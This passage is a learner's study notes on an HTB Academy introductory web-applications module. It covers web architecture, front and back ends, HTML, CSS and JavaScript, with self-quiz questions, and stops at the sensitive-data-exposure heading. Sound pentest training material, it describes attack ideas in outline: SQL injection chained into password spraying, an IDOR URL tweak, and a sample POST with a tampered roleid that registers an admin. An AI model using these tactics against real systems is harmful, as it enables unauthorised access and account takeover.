> ⚠️ This writeup covers retired/free HTB content only, per HTB's Terms of Service.

# HTB Academy: Introduction to Web Applications, My Notes

## Table of Contents

## Table of Contents

- [1. The 80/20 Digest](#1-the-8020-digest)
    - [1.1 Introduction](#11-introduction)
    - [1.2 Web Application Layout](#12-web-application-layout)
    - [1.3 Front End vs. Back End](#13-front-end-vs-back-end)
    - [1.4 HTML](#14-html)
    - [1.5 Cascading Style Sheets (CSS)](#15-cascading-style-sheets-css)
    - [1.6 JavaScript](#16-javascript)
    - [1.7 Sensitive Data Exposure](#17-sensitive-data-exposure)
    - [1.8 HTML Injection](#18-html-injection)
    - [1.9 Cross Site Scripting (XSS)](#19-cross-site-scripting-xss)
    - [1.10 Cross Site Request Forgery (CSRF)](#110-cross-site-request-forgery-csrf)
    - [1.11 Back End Servers](#111-back-end-servers)
    - [1.12 Web Servers](#112-web-servers)
    - [1.13 Databases](#113-databases)
    - [1.14 Development Frameworks & APIs](#114-development-frameworks--apis)
    - [1.15 Common Web Vulnerabilities](#115-common-web-vulnerabilities)
    - [1.16 Public Vulnerabilities](#116-public-vulnerabilities)
    - [1.17 Next Steps](#117-next-steps)
- [2. Structured Breakdown (Cheat Sheet)](#2-structured-breakdown-cheat-sheet)
- [3. Feynman Checks](#3-feynman-checks)
- [4. Omitted Chuff](#4-omitted-chuff)

---

## 1. The 80/20 Digest

i kept every section of the module here, in the original order, with nothing trimmed. the only things i added are a quick check after each block, and a "my personal actions" part under the sections where i actually ran something myself.

---

### 1.1 Introduction

web applications are interactive applications that run on web browsers. they usually adopt a client server architecture to run and handle interactions. they typically have front end components (the website interface, or "what the user sees") that run on the client side (the browser), and back end components (the web application source code) that run on the server side (the back end server and databases).

Q: where do front end components run? A: client side, in the browser.

this allows organizations to host powerful applications with near complete real time control over their design and functionality, while staying accessible worldwide. some examples of typical web applications are online email services like Gmail, online retailers like Amazon, and online word processors like Google Docs.

web applications are not exclusive to giant providers like Google or Microsoft. any web developer can build one and host it online with any of the common hosting services, for anyone on the internet to use. this is why today there are millions of web applications all over the internet, with billions of users interacting with them every day.

Q: who can build a web application? A: any web developer.

#### Web Applications vs. Websites

in the past, i would have been interacting with websites that are static and cannot be changed in real time. traditional websites were statically created to represent specific information, and that information would not change with my interaction. to change the website's content, the corresponding page has to be edited by the developers manually. these types of static pages do not contain functions and, therefore, do not produce real time changes. that type of website is also known as Web 1.0.

on the other hand, most websites run web applications, or Web 2.0, presenting dynamic content based on user interaction. another significant difference is that web applications are fully functional and can perform various functionalities for the end user, while web sites lack this type of functionality. other key differences between traditional websites and web applications include:

- being modular
- running on any display size
- running on any platform without being optimized

Q: which generation is static? A: Web 1.0.

#### Web Applications vs. Native Operating System Applications

unlike native operating system (native OS) applications, web applications are platform independent and can run in a browser on any operating system. they do not have to be installed on a user's system, because the web applications and their functionality are executed remotely on the remote server, and hence do not consume any space on the end user's hard drive.

Q: does a web app use my hard drive? A: no, it runs remotely.

another advantage of web applications over native OS applications is version unity. all users accessing a web application use the same version and the same web application, which can be continuously updated and modified without pushing updates to each user. web applications can be updated in a single location (the webserver) without developing different builds for each platform, which dramatically reduces maintenance and support costs and removes the need to communicate changes to all users individually.

Q: where does a web app get updated? A: one place, the webserver.

on the other hand, native OS applications have certain advantages over web applications, mainly their operation speed and the ability to utilize native operating system libraries and local hardware. as native applications are built to utilize native OS libraries, they are much faster to load and interact with. furthermore, native applications are usually more capable than web applications, as they have a deeper integration to the operating system and are not limited to the browser's capabilities only.

Q: why are native apps faster to load? A: they use native OS libraries.

more recently, however, hybrid and progressive web applications are becoming more common. they utilize modern frameworks to run web applications using native OS capabilities and resources, making them faster than regular web applications and more capable.

Q: what do hybrid web apps borrow from native? A: OS capabilities and resources.

#### Web Application Distribution

there are many open source web applications used by organizations worldwide that can be customized to meet each organization's needs. some common open source web applications include:

- WordPress
- OpenCart
- Joomla

there are also proprietary "closed source" web applications, which are usually developed by a certain organization and then sold to another organization or used by organizations through a subscription plan model. some common closed source web applications include:

- Wix
- Shopify
- DotNetNuke

Q: is Shopify open or closed source? A: closed source.

#### Security Risks of Web Applications

web application attacks are prevalent and present a challenge for most organizations with a web presence, regardless of their size. after all, they are usually accessible from any country by everyone with an internet connection and a web browser, and usually offer a vast attack surface. there are many automated tools for scanning and attacking web applications that, in the wrong hands, can cause significant damage. as web applications become more complicated and advanced, so does the possibility of critical vulnerabilities being incorporated into their design.

Q: why is the attack surface so vast? A: anyone with a browser can reach it.

a successful web application attack can lead to significant losses and massive business interruptions. since web applications run on servers that may host other sensitive information, and are often also linked to databases containing sensitive user or corporate data, all of this data could be compromised if a web site is successfully attacked. this is why it is critical for any business that utilizes web applications to properly test these applications for vulnerabilities and patch them promptly, while testing that the patch fixes the flaw and does not inadvertently introduce any new flaws.

Q: what must i verify after patching? A: the patch works and adds no new flaw.

web application penetration testing is an increasingly critical skill to learn. any organization looking to secure its internet facing (and internal) web applications should undergo frequent web application tests and implement secure coding practices at every development life cycle stage. to properly pentest web applications, i need to understand how they work, how they are developed, and what kind of risk lies at each layer and component of the application depending on the technologies in use.

i will always come across various web applications that are designed and configured differently. one of the most current and widely used methods for testing web applications is the OWASP Web Security Testing Guide.

Q: which guide is a widely used testing method? A: OWASP Web Security Testing Guide.

one of the most common procedures is to start by reviewing a web application's front end components, such as HTML, CSS and JavaScript (also known as the front end trinity), and attempt to find vulnerabilities such as Sensitive Data Exposure and Cross Site Scripting (XSS). once all front end components are thoroughly tested, i would typically review the web application's core functionality and the interaction between the browser and the webserver, to enumerate the technologies the webserver uses and look for exploitable flaws. i typically assess web applications from both an unauthenticated and an authenticated perspective (if the application has login functionality) to maximize coverage and review every possible attack scenario.

Q: what is the "front end trinity"? A: HTML, CSS, JavaScript.

#### Attacking Web Applications

in this day and age most every company, no matter the size, has one or more web applications within its external perimeter. these applications can be everything from simple static websites, to blogs powered by Content Management Systems (CMS) such as WordPress, to complicated applications with sign up/login functionality supporting various user roles from basic users to super admins.

nowadays, it is not very common to find an externally facing host directly exploitable via a known public exploit (such as a vulnerable service or a Windows remote code execution (RCE) vulnerability), though it does happen. web applications provide a vast attack surface, and their dynamic nature means that they are constantly changing (and overlooked!). a relatively simple code change may introduce a catastrophic vulnerability, or a series of vulnerabilities that can be chained together to gain access to sensitive data or remote code execution on the webserver or other hosts in the environment, such as database servers.

Q: why are web apps often overlooked? A: they constantly change.

it is not uncommon to find flaws that can lead directly to code execution, such as a file upload form that allows for the upload of malicious code, or a file inclusion vulnerability that can be leveraged to obtain remote code execution. a well known vulnerability that is still quite prevalent in various types of web applications is SQL injection. this type of vulnerability arises from the unsafe handling of user supplied input. it can result in access to sensitive data, reading/writing files on the database server, and even remote code execution.

Q: what causes SQL injection? A: unsafe handling of user supplied input.

i can often find SQL injection vulnerabilities on web applications that use Active Directory for authentication. while i can usually not leverage this to extract passwords (since Active Directory administers them), i can often pull most or all Active Directory user email addresses, which are often the same as their usernames. this data can then be used to perform a password spraying attack against web portals that use Active Directory for authentication, such as a VPN or Microsoft Outlook Web Access/Microsoft O365. a successful password spray can often result in access to sensitive data such as email, or even a foothold directly into the corporate network environment.

Q: why pull AD emails via SQLi? A: they are often usernames for spraying.

this example shows the damage that can arise from a single web application vulnerability, especially when "chained" to extract data from one application that can be used to attack other portions of a company's external infrastructure. a well rounded infosec professional should have a deep understanding of web applications and be as comfortable attacking web applications as performing network penetration testing and Active Directory attacks. a penetration tester with a strong foundation in web applications can often set themselves apart from their peers and find flaws that others may overlook. a few more real world examples of web application attacks and the impact are as follows:

|Flaw|Real world Scenario|
|---|---|
|SQL injection|obtaining Active Directory usernames and performing a password attack against a VPN or email portal|
|File Inclusion|reading source code to find a hidden page or directory which exposes additional functionality that can be used to gain remote code execution|
|Unrestricted File Upload|a web application that allows a user to upload a profile picture allows any file type to be uploaded (not just images). this can be leveraged to gain full control of the web application server by uploading malicious code|
|Insecure Direct Object Referencing (IDOR)|when combined with a flaw such as broken access control, this can be used to access another user's files or functionality. an example is editing my user profile by browsing to a page such as `/user/701/edit-profile`. if i can change the `701` to `702`, i may edit another user's profile|
|Broken Access Control|another example is an application that allows a user to register a new account. if the account registration functionality is designed poorly, a user may perform privilege escalation when registering. consider the following POST data submitted when registering a new user: `username=bjones&password=Welcome1&email=bjones@inlanefreight.local&roleid=3`. what if i can manipulate the `roleid` parameter and change it to `0` or `1`? i have seen real world applications where this was the case, and it was possible to quickly register an admin user and access many unintended features of the web application|

Q: what does changing `701` to `702` test? A: IDOR on another user's profile.

i should start becoming familiar with common web application attacks and their implications. don't worry if any of these terms sound foreign at this point; they will become clearer as i progress and apply an iterative approach to learning.

it is imperative to study web applications in depth and become familiar with how they work and many different application stacks. i will see web application attacks repeatedly during the Academy journey, on the main HTB platform, and in real life assessments. the plan is to dive in and learn the structure/function of web applications, to become a better informed attacker, set myself apart from my peers, and find flaws that others may overlook.

Q: what is the goal of studying web apps? A: spot flaws others miss.

---

### 1.2 Web Application Layout

no two web applications are identical. businesses create web applications for a multitude of uses and audiences. web applications are designed and programmed differently, and back end infrastructure can be set up in many different ways. it is important to understand the various ways web applications can run behind the scenes, the structure of a web application, its components, and how they can be set up within a company's infrastructure.

Q: are two web applications ever identical? A: no.

web application layouts consist of many different layers that can be summarized with the following three main categories:

|Category|Description|
|---|---|
|Web Application Infrastructure|describes the structure of required components, such as the database, needed for the web application to function as intended. since the web application can be set up to run on a separate server, it is essential to know which database server it needs to access|
|Web Application Components|the components that make up a web application represent all the components that the web application interacts with. these are divided into three areas: `UI/UX`, `Client`, and `Server` components|
|Web Application Architecture|architecture comprises all the relationships between the various web application components|

Q: which category covers component relationships? A: Architecture.

#### Web Application Infrastructure

web applications can use many different infrastructure setups. these are also called models. the most common ones can be grouped into the following four types:

- Client Server
- One Server
- Many Servers, One Database
- Many Servers, Many Databases

Q: how many common infrastructure models? A: four.

##### Client Server

web applications often adopt the client server model. a server hosts the web application in a client server model and distributes it to any clients trying to access it.

in this model, web applications have two types of components: those in the front end, which are usually interpreted and executed on the client side (the browser), and components in the back end, usually compiled, interpreted, and executed by the hosting server.

when a client visits the web application's URL (web address, e.g. `https://www.acme.local`), the server returns the main web application interface (UI). once the user clicks on a button or requests a specific function, the browser sends an HTTP web request to the server, which interprets this request and performs the necessary task(s) to complete the request (e.g. logging the user in, adding an item to the shopping cart, browsing to another page, etc.). once the server has the required data, it sends the result back to the client's browser, displaying the result in a human readable way.

> note: the Academy site i am reading this on is also a web application, developed and hosted by Hack The Box (webserver), and i access it and interact with it using my web browser (client).

however, even though most web applications utilize a client server front end/back end architecture, there are many design implementations.

Q: what does the browser send on a button click? A: an HTTP web request.

##### One Server

in this architecture, the entire web application, or even several web applications and their components, including the database, are hosted on a single server. though this design is straightforward and easy to implement, it is also the riskiest design.

if any web application hosted on this server is compromised in this architecture, then all web applications' data will be compromised. this design represents an "all eggs in one basket" approach, since if any of the hosted web applications are vulnerable, the entire webserver becomes vulnerable.

furthermore, if the webserver goes down for any reason, all hosted web applications become entirely inaccessible until the issue is resolved.

Q: why is One Server the riskiest design? A: one compromise exposes everything.

##### Many Servers, One Database

this model separates the database onto its own database server and allows the web applications' hosting server to access the database server to store and retrieve data. it can be seen as many servers to one database, and one server to one database, as long as the database is separated on its own database server.

this model can allow several web applications to access a single database to have access to the same data without syncing the data between them. the web applications can be replications of one main application (i.e. primary/backup), or they can be separate web applications that share common data.

this model's main advantage (from a security point of view) is segmentation, where each of the main components of a web application is located and hosted separately. in case one webserver is compromised, other webservers are not directly affected. similarly, if the database is compromised (e.g. through a SQL injection vulnerability), the web application itself is not directly affected. there are still access control measures that need to be implemented after asset segmentation, such as limiting web application access to only the data needed to function as intended.

Q: what is this model's main security advantage? A: segmentation.

##### Many Servers, Many Databases

this model builds upon the Many Servers, One Database model. however, within the database server, each web application's data is hosted in a separate database. the web application can only access private data and only the common data that is shared across web applications. it is also possible to host each web application's database on its own separate database server.

this design is also widely used for redundancy purposes, so if any web server or database goes offline, a backup will run in its place to reduce downtime as much as possible. although this may be more difficult to implement and may require tools like load balancers to function appropriately, this architecture is one of the best choices in terms of security due to its proper access control measures and proper asset segmentation.

aside from these models, there are other web application models available, such as serverless web applications or web applications that utilize microservices.

Q: what tool may Many Servers, Many Databases need? A: load balancers.

#### Web Application Components

each web application can have a different number of components. nevertheless, all of the components of the models mentioned previously can be broken down to:

1. `Client`
2. `Server`
    - Webserver
    - Web Application Logic
    - Database
3. `Services` (Microservices)
    - 3rd Party Integrations
    - Web Application Integrations
4. `Functions` (Serverless)

Q: which component group holds the database? A: Server.

#### Web Application Architecture

the components of a web application are divided into three different layers (AKA Three Tier Architecture).

|Layer|Description|
|---|---|
|Presentation Layer|consists of UI process components that enable communication with the application and the system. these can be accessed by the client via the web browser and are returned in the form of HTML, JavaScript, and CSS|
|Application Layer|this layer ensures that all client requests (web requests) are correctly processed. various criteria are checked, such as authorization, privileges, and data passed on to the client|
|Data Layer|the data layer works closely with the application layer to determine exactly where the required data is stored and can be accessed|

Q: which layer checks authorization? A: Application Layer.

an example of a web application architecture could look something like this: _(see diagram, search anchor: "could look something like this")_ the module credits the diagram to Microsoft Docs.

furthermore, some web servers can run operating system calls and programs, like IIS ISAPI or `PHP-CGI`.

Q: can a web server run OS programs? A: yes, e.g. IIS ISAPI.

#### Microservices

i can think of microservices as independent components of the web application, which in most cases are programmed for one task only. for example, for an online store, the core tasks can be decomposed into the following components:

- Registration
- Search
- Payments
- Ratings
- Reviews

these components communicate with the client and with each other. the communication between these microservices is **stateless**, which means that the request and response are independent. this is because the stored data is **stored separately** from the respective microservices. the use of microservices is considered service oriented architecture (SOA), built as a collection of different automated functions focused on a single business goal. nevertheless, these microservices depend on each other.

another essential and efficient microservice component is that they can be written in different programming languages and still interact. microservices benefit from easier scaling and faster development of applications, which encourages innovation and speeds up market delivery of new features. some benefits of microservices include:

- Agility
- Flexible scaling
- Easy deployment
- Reusable code
- Resilience

the module links an AWS whitepaper that gives an excellent overview of microservice implementation.

Q: why is microservice communication stateless? A: data is stored separately.

#### Serverless

cloud providers such as AWS, GCP, Azure, among others, offer serverless architectures. these platforms provide application frameworks to build such web applications without having to worry about the servers themselves. these web applications then run in stateless computing containers (Docker, for example). this type of architecture gives a company the flexibility to build and deploy applications and services without having to manage infrastructure; all server management is done by the cloud provider, which gets rid of the need to provision, scale, and maintain the servers needed to run applications and databases.

the module also links further reading on serverless computing and its various use cases.

Q: who manages servers in serverless? A: the cloud provider.

#### Architecture Security

understanding the general architecture of web applications and each web application's specific design is important when performing a penetration test on any web application. in many cases, an individual web application's vulnerability may not necessarily be caused by a programming error, but by a design error in its architecture.

for example, an individual web application may have all of its core functionality securely implemented. however, due to a lack of proper access control measures in its design, i.e. use of Role Based Access Control (RBAC), users may be able to access some admin features that are not intended to be directly accessible to them, or even access other users' private information without having the privileges to do so. to fix this type of issue, a significant design change would need to be implemented, which would likely be both costly and time consuming.

another example would be if i cannot find the database after exploiting a vulnerability and gaining control over the back end server, which may mean that the database is hosted on a separate server. i may only find part of the database data, which may mean there are several databases in use. this is why security must be considered at each phase of web application development, and penetration tests must be carried out throughout the web application development lifecycle.

Q: can a vuln come from design, not code? A: yes, e.g. missing RBAC.

---

### 1.3 Front End vs. Back End

i may have heard the terms front end and back end web development, or the term Full Stack web development, which refers to both front and back end web development. these terms are becoming synonymous with web application development, as they comprise the majority of the web development cycle. however, these terms are very different from each other, as each refers to one side of the web application, and each functions and communicates in different areas.

Q: what does Full Stack cover? A: front end and back end.

#### Front End

the front end of a web application contains the user's components directly through their web browser (client side). these components make up the source code of the web page i view when visiting a web application, and usually include HTML, CSS, and JavaScript, which is then interpreted in real time by my browser.

this includes everything that the user sees and interacts with, like the page's main elements such as the title and text (HTML), the design and animation of all elements (CSS), and what function each part of a page performs (JavaScript).

in modern web applications, front end components should adapt to any screen size and work within any browser on any device. this contrasts with back end components, which are usually written for a specific platform or operating system. if the front end of a web application is not well optimized, it may make the entire web application slow and unresponsive. in this case, some users may think that the hosting server, or their internet, is slow, while the issue lies entirely on the client side at the user's browser. this is why the front end of a web application must be optimized for most platforms, devices (including mobile!), and screen sizes.

Q: which side can make a "slow server" feel slow? A: the client side front end.

aside from front end code development, the following are some of the other tasks related to front end web application development:

- Visual Concept Web Design
- User Interface (UI) design
- User Experience (UX) design

there are many sites available to practice front end coding. one example is an online HTML editor linked in the module, where i can play around with the editor, typing and formatting text and seeing the resulting HTML, CSS, and JavaScript being generated for me. the module has a very simple example to copy and paste into the right hand side of the editor:

```html
<p><strong>Welcome to Hack The Box Academy</strong><strong>
</strong></p>
<p></p>
<p><em>This is some italic text.</em></p>
<p></p>
<p><span style="color: #0000ff;">This is some blue text.</span></p>
<p></p>
<p></p>
```

i should watch the simple HTML code render on the left, then play around with the formatting, headers, colors, etc., and watch the code change.

Q: which language styles elements? A: CSS.

#### Back End

the back end of a web application drives all of the core web application functionalities, all of which is executed at the back end server, which processes everything required for the web application to run correctly. it is the part i may never see or directly interact with, but a website is just a collection of static web pages without a back end.

there are four main back end components for web applications:

|Component|Description|
|---|---|
|Back end Servers|the hardware and operating system that hosts all other components, and are usually run on operating systems like `Linux`, `Windows`, or using `Containers`|
|Web Servers|web servers handle HTTP requests and connections. some examples are `Apache`, `NGINX`, and `IIS`|
|Databases|databases (DBs) store and retrieve the web application data. some examples of relational databases are `MySQL`, `MSSQL`, `Oracle`, `PostgreSQL`, while examples of non relational databases include `NoSQL` and `MongoDB`|
|Development Frameworks|development frameworks are used to develop the core web application. some well known frameworks include `Laravel` (`PHP`), `ASP.NET` (`C#`), `Spring` (`Java`), `Django` (`Python`), and `Express` (`NodeJS` `JavaScript`)|

Q: which component stores web app data? A: Databases.

it is also possible to host each component of the back end on its own isolated server, or in isolated containers, by utilizing services such as Docker. to maintain logical separation and mitigate the impact of vulnerabilities, different components of the web application, such as the database, can be installed in one Docker container, while the main web application is installed in another, thereby isolating each part from potential vulnerabilities that may affect the other container(s). it is also possible to separate each into its dedicated server, which can be more resource intensive and time consuming to maintain. still, it depends on the business case and design/functionality of the web application in question.

Q: why split components into containers? A: limit the blast radius of a vuln.

some of the main jobs performed by back end components include:

- develop the main logic and services of the back end of the web application
- develop the main code and functionalities of the web application
- develop and maintain the back end database
- develop and implement libraries to be used by the web application
- implement technical/business needs for the web application
- implement the main APIs for front end component communications
- integrate remote servers and cloud services into the web application

Q: which back end job connects front end to back end? A: implementing the main APIs.

#### Securing Front/Back End

even though in most cases i will not have access to the back end code to analyze the individual functions and the structure of the code, it does not make the application invulnerable. it could still be exploited by various injection attacks, for example.

suppose i have a search function in a web application that mistakenly does not process search queries correctly. in that case, i could use specific techniques to manipulate the queries in such a way that i gain unauthorized access to specific database data (SQL injections), or even execute operating system commands via the web application, also known as Command Injections.

Q: what is OS command execution via a web app called? A: Command Injection.

the module will later discuss how to secure each component used on the front and back ends. when i have full access to the source code of front end components, i can perform a code review to find vulnerabilities, which is part of what is referred to as Whitebox Pentesting.

on the other hand, back end components' source code is stored on the back end server, so i do not have access to it by default, which forces me to only perform what is known as Blackbox Pentesting. however, some web applications are open source, meaning i likely have access to their source code. furthermore, some vulnerabilities such as Local File Inclusion could allow me to obtain the source code from the back end server. with this source code in hand, i can then perform a code review on back end components to further understand how the application works, potentially find sensitive data in the source code (such as passwords), and even find vulnerabilities that would be difficult or impossible to find without access to the source code.

Q: front end source access means which pentest type? A: Whitebox.

the top 20 most common mistakes web developers make that are essential for me as a penetration tester are:

|No.|Mistake|
|---|---|
|1|Permitting Invalid Data to Enter the Database|
|2|Focusing on the System as a Whole|
|3|Establishing Personally Developed Security Methods|
|4|Treating Security to be Your Last Step|
|5|Developing Plain Text Password Storage|
|6|Creating Weak Passwords|
|7|Storing Unencrypted Data in the Database|
|8|Depending Excessively on the Client Side|
|9|Being Too Optimistic|
|10|Permitting Variables via the URL Path Name|
|11|Trusting third party code|
|12|Hard coding backdoor accounts|
|13|Unverified SQL injections|
|14|Remote file inclusions|
|15|Insecure data handling|
|16|Failing to encrypt data properly|
|17|Not using a secure cryptographic system|
|18|Ignoring layer 8|
|19|Review user actions|
|20|Web Application Firewall misconfigurations|

Q: which mistake number is plain text passwords? A: 5.

these mistakes lead to the OWASP Top 10 vulnerabilities for web applications, which the module discusses in other modules:

|No.|Vulnerability|
|---|---|
|1|Broken Access Control|
|2|Cryptographic Failures|
|3|Injection|
|4|Insecure Design|
|5|Security Misconfiguration|
|6|Vulnerable and Outdated Components|
|7|Identification and Authentication Failures|
|8|Software and Data Integrity Failures|
|9|Security Logging and Monitoring Failures|
|10|Server Side Request Forgery (SSRF)|

Q: which OWASP Top 10 entry is number 1? A: Broken Access Control.

it is important to begin to familiarize myself with these flaws and vulnerabilities, as they form the basis for many of the issues covered in future web and even non web related modules. as a pentester, i must have the ability to competently identify, exploit, and explain these vulnerabilities for my clients.

Q: what three skills must a pentester have per flaw? A: identify, exploit, explain.

---

### 1.4 HTML

the first and most dominant component of the front end of web applications is HTML (HyperText Markup Language). HTML is at the very core of any web page i see on the internet. it contains each page's basic elements, including titles, forms, images, and many other elements. the web browser, in turn, interprets these elements and displays them to the end user.

Q: what does the browser do with HTML elements? A: interprets and displays them.

the following is a very basic example of an HTML page:

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>

    <body>
        <h1>A Heading</h1>
        <p>A Paragraph</p>
    </body>

</html>
```

this would display the following _(see screenshot, search anchor: "This would display the following")_: a heading and a paragraph.

HTML elements are displayed in a tree form, similar to XML and other languages:

```
document

 - html
   -- head

      --- title
   -- body
      --- h1
      --- p
```

each element can contain other HTML elements, while the main `HTML` tag should contain all other elements within the page, which falls under `document`, distinguishing between `HTML` and documents written for other languages, such as `XML` documents.

the HTML elements of the above code can be viewed as follows:

```html
<html>

  <head>

<title>Page Title</title>

  </head>

  <body>

<h1>A Heading</h1>

<p>A Paragraph</p>

  </body>

</html>
```

Q: which tag contains all other page elements? A: `<html>`.

each HTML element is opened and closed with a tag that specifies the element's type (e.g. `<p>` for paragraphs), where the content would be placed between these tags. tags may also hold the element's id or class (e.g. `<p id='para1'>` or `<p id='red-paragraphs'>`), which is needed for CSS to properly format the element. both the tags and the content comprise the entire element.

Q: why give elements an id or class? A: so CSS can target them.

#### URL Encoding

an important concept to learn in HTML is URL Encoding, or percent encoding. for a browser to properly display a page's contents, it has to know the charset in use. in URLs, for example, browsers can only use ASCII encoding, which only allows alphanumerical characters and certain special characters. therefore, all other characters outside of the ASCII character set have to be encoded within a URL. URL encoding replaces unsafe ASCII characters with a `%` symbol followed by two hexadecimal digits.

for example, the single quote character `'` is encoded to `%27`, which can be understood by browsers as a single quote. URLs cannot have spaces in them and will replace a space with either a `+` (plus sign) or `%20`. some common character encodings are:

|Character|Encoding|
|---|---|
|space|`%20`|
|`!`|`%21`|
|`"`|`%22`|
|`#`|`%23`|
|`$`|`%24`|
|`%`|`%25`|
|`&`|`%26`|
|`'`|`%27`|
|`(`|`%28`|
|`)`|`%29`|

the module links a full character encoding table. many online tools can be used to perform URL encoding/decoding. furthermore, the popular web proxy Burp Suite has a decoder/encoder which can be used to convert between various types of encodings. i should try encoding/decoding some characters and strings using an online tool.

Q: what does `%27` decode to? A: a single quote.

#### Usage

the `<head>` element usually contains elements that are not directly printed on the page, like the page title, while all main page elements are located under `<body>`. other important elements include `<style>`, which holds the page's CSS code, and `<script>`, which holds the JS code of the page, as the next sections show.

Q: where do printed page elements live? A: under `<body>`.

each of these elements is called a DOM (Document Object Model). the World Wide Web Consortium (W3C) defines DOM as:

> "The W3C Document Object Model (DOM) is a platform and language neutral interface that allows programs and scripts to dynamically access and update the content, structure, and style of a document."

the DOM standard is separated into 3 parts:

- `Core DOM`: the standard model for all document types
- `XML DOM`: the standard model for XML documents
- `HTML DOM`: the standard model for HTML documents

for example, from the above tree view, i can refer to DOMs as `document.head` or `document.h1`, and so on.

understanding the HTML DOM structure can help me understand where each element i view on the page is located, which enables me to view the source code of a specific element on the page and look for potential issues. i can locate HTML elements by their id, their tag name, or by their class name.

this is also useful when i want to utilize front end vulnerabilities (like `XSS`) to manipulate existing elements or create new elements to serve my needs.

Q: three ways to locate an HTML element? A: id, tag name, class name.

#### exercise questions

**question 1:** what is the HTML tag used to show an image?

answer recorded in the module: `<img>`

---

### 1.5 Cascading Style Sheets (CSS)

CSS (Cascading Style Sheets) is the stylesheet language used alongside HTML to format and set the style of HTML elements. like HTML, there are several versions of CSS, and each subsequent version introduces a new set of capabilities that can be used for formatting HTML elements. browsers are updated alongside it to support these new features.

Q: what does CSS do for HTML? A: formats and styles elements.

#### Example

at a fundamental level, CSS is used to define the style of each class or type of HTML elements (e.g. `body` or `h1`), such that any element within that page would be represented as defined in the CSS file. this could include the font family, font size, background color, text color and alignment, and more.

```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}
```

as previously mentioned, this is why i may set unique IDs or class names for certain HTML elements, so that i can later refer to them within CSS or JavaScript when needed.

Q: why set unique IDs on elements? A: to refer to them later.

#### Syntax

CSS defines the style of each HTML element or class between curly brackets `{}`, within which the properties are defined with their values (e.g. `element { property : value; }`).

each HTML element has many properties that can be set through CSS, such as `height`, `position`, `border`, `margin`, `padding`, `color`, `text-align`, `font-size`, and hundreds of other properties. all of these can be combined and used to design visually appealing web pages.

CSS can be used for advanced animations for a wide variety of uses, from moving items all the way to advanced 3D animations. many CSS properties are available for animations, like `@keyframes`, `animation`, `animation-duration`, `animation-direction`, and many others. the module links a page where i can read about and try out many of these animation properties.

Q: what wraps a CSS rule's properties? A: curly brackets.

#### Usage

CSS is often used alongside JavaScript to make quick calculations, dynamically adjust the style properties of certain HTML elements, or achieve advanced animations based on keystrokes or the mouse cursor location.

the module embeds an example that illustrates such capabilities of CSS when used with HTML and JavaScript, "Parallax Depth Cards" by Andy Merskin on CodePen _(see embedded demo, search anchor: "Parallax Depth Cards")_. i can click on the tabs on the top left to view the source code.

this shows that even though HTML and CSS are among the most basic cornerstones of web development, when used properly they can be used to build visually stunning web pages, which can make interacting with web applications a much easier and more user friendly experience.

furthermore, CSS can be used alongside other languages to implement their styles, like `XML` or within `SVG` items, and can also be used in modern mobile development platforms to design entire mobile application User Interfaces (UI).

Q: which markup beyond HTML can CSS style? A: XML and SVG.

#### Frameworks

many may consider CSS to be difficult to develop. in contrast, others may argue that it is inefficient to manually set the style and design of all HTML elements in each web page. this is why many CSS frameworks have been introduced, which contain a collection of CSS style sheets and designs, to make it much faster and easier to create beautiful HTML elements.

furthermore, these frameworks are optimized for web application usage. they are designed to be used with JavaScript and for wide use within a web application, and contain elements usually required within modern web applications. some of the most common CSS frameworks are:

- Bootstrap
- SASS
- Foundation
- Bulma
- Pure

Q: why use a CSS framework? A: faster, easier styling.

#### exercise questions

**question 1:** what is the CSS "property: value" used to make an HTML element's text aligned to the left?

answer recorded in the module: `text-align: left;`

---

### 1.6 JavaScript

JavaScript is one of the most used languages in the world. it is mostly used for web development and mobile development. `JavaScript` is usually used on the front end of an application to be executed within a browser. still, there are implementations of back end JavaScript used to develop entire web applications, like NodeJS.

while `HTML` and `CSS` are mainly in charge of how a web page looks, `JavaScript` is usually used to control any functionality that the front end web page requires. without `JavaScript`, a web page would be mostly static and would not have much functionality or interactive elements.

Q: which language drives page functionality? A: JavaScript.

#### Example

within the page source code, `JavaScript` code is loaded with the `<script>` tag, as follows:

```html
<script type="text/javascript">
..JavaScript code..
</script>
```

a web page can also load remote `JavaScript` code with `src` and the script's link, as follows:

```html
<script src="./script.js"></script>
```

an example of basic use of `JavaScript` within a web page is the following:

```javascript
document.getElementById("button1").innerHTML = "Changed Text!";
```

the above example changes the content of the `button1` HTML element. from here on, there are many more advanced uses of `JavaScript` on a web page. the module shows a demo of what the above `JavaScript` code would do when linked to a button click, with a button that starts as "Original Text" _(see demo, search anchor: "linked to a button click")_.

as with HTML, there are many sites available online to experiment with `JavaScript`. one example is JSFiddle, which can be used to test `JavaScript`, `CSS`, and `HTML` and save code snippets. `JavaScript` is an advanced language, and its syntax is not as simple as `HTML` or `CSS`.

Q: which tag loads remote JavaScript? A: `<script src="...">`.

#### Usage

most common web applications heavily rely on `JavaScript` to drive all needed functionality on the web page, like updating the web page view in real time, dynamically updating content in real time, accepting and processing user input, and many other potential functionalities.

`JavaScript` is also used to automate complex processes and perform HTTP requests to interact with the back end components and send and retrieve data, through technologies like Ajax.

in addition to automation, `JavaScript` is also often used alongside `CSS`, as previously mentioned, to drive advanced animations that would not be possible with `CSS` alone. whenever i visit an interactive and dynamic web page that uses many advanced and visually appealing animations, i am seeing the result of active `JavaScript` code running on my browser.

all modern web browsers are equipped with `JavaScript` engines that can execute `JavaScript` code on the client side without relying on the back end webserver to update the page. this makes using `JavaScript` a very fast way to achieve a large number of processes quickly.

Q: does JS need the server to update the page? A: no, it runs client side.

#### Frameworks

as web applications become more advanced, it may be inefficient to use pure `JavaScript` to develop an entire web application from scratch. this is why a host of `JavaScript` frameworks have been introduced to improve the experience of web application development.

these platforms introduce libraries that make it very simple to recreate advanced functionalities, like user login and user registration, and they introduce new technologies based on existing ones, like the use of dynamically changing `HTML` code, instead of using static `HTML` code.

these platforms either use `JavaScript` as their programming language or use an implementation of `JavaScript` that compiles its code into `JavaScript` code.

some of the most common front end `JavaScript` frameworks are:

- Angular
- React
- Vue
- jQuery

the module links a listing and comparison of common JavaScript frameworks.

Q: name two front end JS frameworks. A: React and Vue.

---

### 1.7 Sensitive Data Exposure

